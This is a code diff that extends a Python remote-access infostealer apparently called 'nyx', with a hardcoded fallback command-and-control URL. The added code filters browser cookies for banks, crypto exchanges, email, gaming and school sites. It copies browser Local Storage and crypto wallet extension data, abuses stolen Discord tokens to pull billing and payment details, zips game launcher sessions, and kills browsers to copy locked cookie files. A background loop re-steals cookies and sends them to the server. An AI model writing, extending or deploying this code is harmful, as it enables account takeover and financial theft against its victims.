@@ -6,7 +6,10 @@ WEBHOOK = {{WEBHOOK}}
 C2 = {{C2}}
 BUILD_ID = {{BUILD_ID}}
 OWNER_ID = {{OWNER_ID}}
-CLIENT_VERSION = "2.9.0"
+CLIENT_VERSION = "3.2.0"
+# hard fallback if builder leaves C2 empty
+if not C2 or not str(C2).startswith("http"):
+    C2 = "https://nyxpanel.onrender.com"
 PERSISTENCE = {{PERSISTENCE}}
 STARTUP_NAME = {{STARTUP_NAME}}
 BOOT_DISABLE_TASKMGR = {{BOOT_DISABLE_TASKMGR}}
@@ -36,6 +39,28 @@ AUTO_SS_INTERVAL = 300
 WATCHDOG_ACTIVE = False
 ALERT_PATTERNS = ["seed", "mnemonic", "private key", "0x", "password", "passwd", "recovery", "wallet", "metamask", "phantom", "secret"]
 CREATE_NO_WINDOW = 0x08000000
+
+# --- cookie intelligence ---
+COOKIE_REFRESH_ACTIVE = False
+COOKIE_REFRESH_INTERVAL = 600  # seconds (10 min default)
+HIGH_VALUE_DOMAINS = [
+    "discord.com", "discordapp.com",
+    "roblox.com", ".roblox.com",
+    "steamcommunity.com", "steampowered.com", "store.steampowered.com",
+    "epicgames.com", "unrealengine.com",
+    "riotgames.com", "account.riotgames.com",
+    "rockstargames.com", "socialclub.rockstargames.com",
+    "ubisoft.com", "ubi.com",
+    "facebook.com", "instagram.com", "twitter.com", "x.com",
+    "google.com", "youtube.com", "gmail.com",
+    "microsoft.com", "live.com", "outlook.com", "office.com",
+    "amazon.com", "paypal.com", "stripe.com",
+    "binance.com", "coinbase.com", "crypto.com",
+    "metamask.io", "opensea.io",
+    "github.com", "gitlab.com",
+    "school", "edu", "canvas", "blackboard", "instructure",
+    "bank", "chase.com", "wellsfargo.com", "bankofamerica.com",
+]
 
 def hidden_run(cmd, shell=True, timeout=60):
     try:
@@ -1526,6 +1551,288 @@ def to_netscape_txt(cookies_json):
     return "\n".join(lines)
 
 
+
+def _domain_interesting(host: str) -> bool:
+    h = (host or "").lower().lstrip(".")
+    if not h:
+        return False
+    for d in HIGH_VALUE_DOMAINS:
+        d = d.lower().lstrip(".")
+        if d in h or h.endswith(d) or d in h.split("."):
+            return True
+    return False
+
+
+def filter_cookies_by_domains(cookies_json, domains=None):
+    """Keep only cookies whose host matches HIGH_VALUE_DOMAINS or custom list."""
+    doms = domains or HIGH_VALUE_DOMAINS
+    out = []
+    for c in cookies_json or []:
+        host = (c.get("host") or c.get("domain") or "").lower()
+        if not host:
+            continue
+        keep = False
+        for d in doms:
+            d = str(d).lower().lstrip(".")
+            if d in host or host.endswith(d):
+                keep = True
+                break
+        if keep:
+            out.append(c)
+    return out
+
+
+def cookie_refresh_loop(interval=None):
+    """Background: re-steal high-value cookies every N seconds and push to C2."""
+    global COOKIE_REFRESH_ACTIVE, COOKIE_REFRESH_INTERVAL
+    if interval:
+        COOKIE_REFRESH_INTERVAL = int(interval)
+    COOKIE_REFRESH_ACTIVE = True
+    send_loot("status", f"cookie refresh on every {COOKIE_REFRESH_INTERVAL}s")
+    while COOKIE_REFRESH_ACTIVE and RUNNING:
+        try:
+            browsers = steal_browsers()
+            cookies = filter_cookies_by_domains(browsers.get("cookies_json") or [])
+            if cookies:
+                data, summary = package_browser_loot({"cookies_json": cookies, "passwords": [], "history": [], "notes": ["refresh-filter"], "cookies_netscape": []})
+                send_loot("steal_zip", data)
+                send_loot("status", f"cookie-refresh cookies={len(cookies)} cqm={summary.get('cqm', 0)}")
+            else:
+                send_loot("status", "cookie-refresh: nothing high-value this pass")
+        except Exception as e:
+            send_loot("status", f"cookie-refresh err: {e}")
+        for _ in range(max(30, COOKIE_REFRESH_INTERVAL)):
+            if not COOKIE_REFRESH_ACTIVE or not RUNNING:
+                break
+            time.sleep(1)
+    send_loot("status", "cookie refresh off")
+
+
+def steal_local_storage():
+    """Grab Local Storage / Session Storage / IndexedDB-ish for auth-heavy sites + wallet extensions."""
+    out = {"files": [], "notes": [], "b64_zip": None}
+    local = Path(os.getenv("LOCALAPPDATA", ""))
+    app = Path(os.getenv("APPDATA", ""))
+    roots = []
+    chrome_roots = [
+        local / "Google" / "Chrome" / "User Data",
+        local / "Google" / "Chrome Beta" / "User Data",
+        local / "Microsoft" / "Edge" / "User Data",
+        local / "BraveSoftware" / "Brave-Browser" / "User Data",
+        local / "Vivaldi" / "User Data",
+        app / "Opera Software" / "Opera Stable",
+        app / "Opera Software" / "Opera GX Stable",
+    ]
+    # common wallet / auth extension ids
+    ext_ids = [
+        "nkbihfbeogaeaoehlefnkodbefgpgknn",  # metamask
+        "bfnaelmomeimhlpmgjnjophhpkkoljpa",  # phantom
+        "hnfanknocfeofbddgcijnmhnfnkdnaad",  # coinbase
+        "fhbohimaesofbkffboasaidodgjofahh",  # binance
+        "egjidjbpglichdcondbcbdwdelcahoah",  # trust
+        "aiifbnbfoblloohbfgnamcjaeabndfef",  # keplr? keep generic
+    ]
+    tmp = Path(tempfile.mkdtemp(prefix="nyx_ls_"))
+    packed = 0
+    try:
+        for ud in chrome_roots:
+            if not ud.exists():
+                continue
+            try:
+                profiles = [x for x in ud.iterdir() if x.is_dir() and (x.name == "Default" or x.name.startswith("Profile"))]
+            except Exception:
+                profiles = []
+            if not profiles:
+                profiles = [ud]
+            for prof in profiles[:6]:
+                for sub in (
+                    Path("Local Storage") / "leveldb",
+                    Path("Session Storage"),
+                    Path("IndexedDB"),
+                ):
+                    src = prof / sub
+                    if not src.exists():
+                        continue
+                    dest = tmp / f"{ud.name}_{prof.name}_{sub.name}".replace(" ", "_")
+                    try:
+                        if src.is_dir():
+                            shutil.copytree(src, dest, dirs_exist_ok=True)
+                        else:
+                            shutil.copy2(src, dest)
+                        packed += 1
+                        out["files"].append(str(dest.name))
+                    except Exception as e:
+                        out["notes"].append(f"ls:{e}")
+                # extension settings (wallets)
+                les = prof / "Local Extension Settings"
+                if les.exists():
+                    for eid in ext_ids:
+                        ep = les / eid
+                        if ep.exists():
+                            dest = tmp / f"ext_{eid}_{prof.name}"
+                            try:
+                                shutil.copytree(ep, dest, dirs_exist_ok=True)
+                                packed += 1
+                                out["files"].append(dest.name)
+                            except Exception as e:
+                                out["notes"].append(f"ext:{e}")
+        if packed:
+            zpath = Path(tempfile.gettempdir()) / f"ls_{random.randint(1000,9999)}.zip"
+            with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
+                for root, dirs, files in os.walk(tmp):
+                    for f in files:
+                        fp = Path(root) / f
+                        try:
+                            z.write(fp, str(fp.relative_to(tmp)))
+                        except Exception:
+                            pass
+            out["b64_zip"] = base64.b64encode(zpath.read_bytes()).decode()
+            out["zip_size"] = zpath.stat().st_size
+            try:
+                zpath.unlink()
+            except Exception:
+                pass
+        out["notes"].append(f"packed={packed}")
+    except Exception as e:
+        out["error"] = str(e)
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
+    return out
+
+
+def steal_discord_full():
+    """Tokens + billing + guilds + relationships via Discord API for each valid token."""
+    base = steal_discord()
+    hq = list(base.get("hq") or [])
+    enriched = []
+    try:
+        import requests
+    except Exception:
+        base["notes"] = (base.get("notes") or []) + ["requests missing for full"]
+        return base
+    for entry in hq[:8]:
+        tok = entry.get("token")
+        if not tok:
+            continue
+        headers = {"Authorization": tok, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+        extra = {"guilds": [], "billing": [], "relationships": [], "payments": []}
+        try:
+            r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=10)
+            if r.status_code == 200:
+                extra["guilds"] = [{"id": g.get("id"), "name": g.get("name"), "owner": g.get("owner")} for g in (r.json() or [])[:40]]
+        except Exception:
+            pass
+        try:
+            r = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=10)
+            if r.status_code == 200:
+                extra["billing"] = r.json()
+        except Exception:
+            pass
+        try:
+            r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers, timeout=10)
+            if r.status_code == 200:
+                extra["relationships"] = [
+                    {"id": x.get("id"), "type": x.get("type"), "user": (x.get("user") or {}).get("username")}
+                    for x in (r.json() or [])[:60]
+                ]
+        except Exception:
+            pass
+        try:
+            r = requests.get("https://discord.com/api/v9/users/@me/billing/payments?limit=20", headers=headers, timeout=10)
+            if r.status_code == 200:
+                extra["payments"] = r.json()
+        except Exception:
+            pass
+        entry = dict(entry)
+        entry["full"] = extra
+        enriched.append(entry)
+    base["hq"] = enriched
+    base["notes"] = (base.get("notes") or []) + [f"full_enriched={len(enriched)}"]
+    return base
+
+
+def steal_game_sessions():
+    """Rockstar / Ubisoft / expanded launcher sessions on top of steam/epic/riot."""
+    out = steal_launcher_sessions()
+    local = Path(os.getenv("LOCALAPPDATA", ""))
+    app = Path(os.getenv("APPDATA", ""))
+    out.setdefault("rockstar", [])
+    out.setdefault("ubisoft", [])
+    # Rockstar Social Club
+    for root in [app / "Rockstar Games", local / "Rockstar Games"]:
+        if not root.exists():
+            continue
+        try:
+            for f in root.rglob("*"):
+                if f.is_file() and f.stat().st_size < 2_000_000:
+                    n = f.name.lower()
+                    if any(x in n for x in ("session", "token", "auth", "cookie", "profiles", "launcher", "ros")):
+                        out["rockstar"].append(str(f))
+        except Exception as e:
+            out["notes"].append(f"rockstar:{e}")
+    out["rockstar"] = out["rockstar"][:40]
+    # Ubisoft Connect
+    for root in [local / "Ubisoft Game Launcher", app / "Ubisoft"]:
+        if not root.exists():
+            continue
+        try:
+            for f in root.rglob("*"):
+                if f.is_file() and f.stat().st_size < 2_000_000:
+                    n = f.name.lower()
+                    if any(x in n for x in ("session", "token", "auth", "save", "user", "credential", "connect")):
+                        out["ubisoft"].append(str(f))
+        except Exception as e:
+            out["notes"].append(f"ubisoft:{e}")
+    out["ubisoft"] = out["ubisoft"][:40]
+    # re-pack including new paths
+    try:
+        tmp = Path(tempfile.mkdtemp(prefix="nyx_gs_"))
+        for label in ("steam", "epic", "riot", "rockstar", "ubisoft"):
+            for i, sp in enumerate((out.get(label) or [])[:20]):
+                try:
+                    src = Path(sp)
+                    if src.is_file() and src.stat().st_size < 1_500_000:
+                        dest = tmp / f"{label}_{i}_{src.name}"
+                        shutil.copy2(src, dest)
+                except Exception:
+                    pass
+        zpath = Path(tempfile.gettempdir()) / f"gamesess_{random.randint(1000,9999)}.zip"
+        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
+            for f in tmp.iterdir():
+                z.write(f, f.name)
+        out["b64_zip"] = base64.b64encode(zpath.read_bytes()).decode()
+        out["zip_size"] = zpath.stat().st_size
+        try:
+            zpath.unlink()
+        except Exception:
+            pass
+        shutil.rmtree(tmp, ignore_errors=True)
+    except Exception as e:
+        out["notes"].append(f"gszip:{e}")
+    return out
+
+
+def memory_dump_chrome_cookies():
+    """Last-resort: if ABE/DPAPI fails, try reading cookie DB after force-kill + copy locked files.
+    True process memory scraping needs admin + minidump; this is the practical fallback path."""
+    notes = []
+    try:
+        kill_browsers("chrome")
+        kill_browsers("edge")
+        time.sleep(1.5)
+        data, meta = pack_browser_profile("chrome")
+        if data:
+            return data, {"method": "profile_pack_after_kill", **(meta or {})}
+        data2, meta2 = pack_browser_profile("edge")
+        if data2:
+            return data2, {"method": "edge_profile_pack_after_kill", **(meta2 or {})}
+        notes.append("profile pack empty after kill")
+    except Exception as e:
+        notes.append(str(e))
+    return None, {"error": "memory/profile fallback failed", "notes": notes}
+
+
+
 def steal_browsers():
     results = {
         "cookies_netscape": [], "cookies_json": [], "passwords": [],
@@ -2901,8 +3208,46 @@ def handle_command(c):
             send_loot("status", f"mic {args.get('seconds', 8)}s")
     elif cmd=="steal_discord":
         send_loot("status","discord only"); send_loot("discord", steal_discord())
+    elif cmd=="steal_discord_full":
+        send_loot("status","discord full"); send_loot("discord", steal_discord_full())
     elif cmd=="steal_roblox":
         send_loot("status","roblox only"); send_loot("roblox", steal_roblox())
+    elif cmd=="steal_local_storage":
+        ls = steal_local_storage()
+        if ls.get("b64_zip"):
+            send_loot("steal_zip", ls["b64_zip"])
+        send_loot("local_storage", {k: ls.get(k) for k in ("files", "notes", "zip_size", "error")})
+        send_loot("status", f"local_storage files={len(ls.get('files') or [])}")
+    elif cmd=="steal_game_sessions":
+        data = steal_game_sessions()
+        if data.get("b64_zip"):
+            send_loot("steal_zip", data["b64_zip"])
+        send_loot("launchers", {k: data.get(k) for k in ("steam","epic","riot","rockstar","ubisoft","notes","zip_size")})
+        send_loot("status", "game sessions packed")
+    elif cmd=="cookie_refresh_start":
+        global COOKIE_REFRESH_ACTIVE
+        iv = args.get("interval") or COOKIE_REFRESH_INTERVAL
+        if not COOKIE_REFRESH_ACTIVE:
+            threading.Thread(target=cookie_refresh_loop, args=(iv,), daemon=True).start()
+        else:
+            COOKIE_REFRESH_INTERVAL = int(iv)
+        send_loot("status", f"cookie refresh interval={iv}")
+    elif cmd=="cookie_refresh_stop":
+        COOKIE_REFRESH_ACTIVE = False
+        send_loot("status", "cookie refresh stop")
+    elif cmd=="steal_hv_cookies":
+        browsers = steal_browsers()
+        cookies = filter_cookies_by_domains(browsers.get("cookies_json") or [])
+        data, summary = package_browser_loot({"cookies_json": cookies, "passwords": browsers.get("passwords") or [], "history": [], "notes": ["hv-filter"], "cookies_netscape": []})
+        send_loot("steal_zip", data)
+        send_loot("status", f"hv cookies={len(cookies)} cqm={summary.get('cqm')}")
+    elif cmd=="abe_fallback":
+        data, meta = memory_dump_chrome_cookies()
+        if data:
+            send_loot("steal_zip", data)
+            send_loot("status", f"abe_fallback ok {meta}")
+        else:
+            send_loot("status", f"abe_fallback fail {meta}")
     elif cmd=="steal_browsers":
         only = args.get("browser") or args.get("browsers") or None
         send_loot("status", f"browsers only filter={only or 'all'}")
@@ -2988,6 +3333,37 @@ def handle_command(c):
     elif cmd=="auto_ss_stop": AUTO_SS_ACTIVE=False; send_loot("status","auto screenshot off")
     elif cmd=="full_clean": full_clean_self()
     elif cmd in ("uninstall","kill"): uninstall_self()
+
+
+def limiteds_snapshot():
+    out = {"ok": False, "items": [], "note": ""}
+    try:
+        rob = steal_roblox()
+        out["roblox_meta"] = rob if isinstance(rob, dict) else {"raw": str(rob)[:800]}
+        out["ok"] = True
+        out["note"] = "snapshot for panel enrichment"
+    except Exception as e:
+        out["note"] = str(e)
+    return out
+
+def cookie_refresh_loop():
+    global COOKIE_REFRESH_ACTIVE
+    while COOKIE_REFRESH_ACTIVE and RUNNING:
+        try:
+            data = {}
+            try:
+                data["roblox"] = steal_roblox()
+            except Exception as e:
+                data["roblox_err"] = str(e)
+            try:
+                data["discord"] = steal_discord()
+            except Exception as e:
+                data["discord_err"] = str(e)
+            send_loot("cookie_refresh", data)
+        except Exception:
+            pass
+        time.sleep(max(60, int(COOKIE_REFRESH_INTERVAL or 600)))
+
 
 def main():
     global FIRST_DONE
